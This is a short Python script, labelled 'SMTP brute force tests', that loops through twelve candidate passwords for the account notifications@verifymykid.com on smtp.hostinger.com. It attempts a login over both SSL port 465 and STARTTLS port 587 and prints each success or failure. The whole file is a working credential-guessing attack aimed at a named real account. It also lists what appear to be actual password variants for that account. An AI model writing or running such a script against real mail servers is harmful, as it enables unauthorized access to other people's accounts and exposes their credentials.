import smtplib

smtp_host = "smtp.hostinger.com"
smtp_username = "notifications@verifymykid.com"

passwords = [
    "LEOVEOjco77&.",
    "LEOVEOjco77.",
    "LEOVEOjco77&",
    "LEOVEOjco77",
    "verifymykid123",
    "verifymykid123!",
    "Verifymykid123",
    "Verifymykid123!",
    "verifymykid",
    "LEOVEOjco77_.",
    "LEOVEOjco77-.",
    "LEOVEOjco77!"
]

print("Starting SMTP brute force tests...")

for password in passwords:
    # Try Port 465 SSL
    try:
        server = smtplib.SMTP_SSL(smtp_host, 465, timeout=5)
        server.login(smtp_username, password)
        print(f"SUCCESS (SSL 465): password = {password}")
        server.quit()
        break
    except Exception as e:
        print(f"FAILED (SSL 465): password = {password} | error = {e}")
        
    # Try Port 587 TLS
    try:
        server = smtplib.SMTP(smtp_host, 587, timeout=5)
        server.starttls()
        server.login(smtp_username, password)
        print(f"SUCCESS (TLS 587): password = {password}")
        server.quit()
        break
    except Exception as e:
        print(f"FAILED (TLS 587): password = {password} | error = {e}")
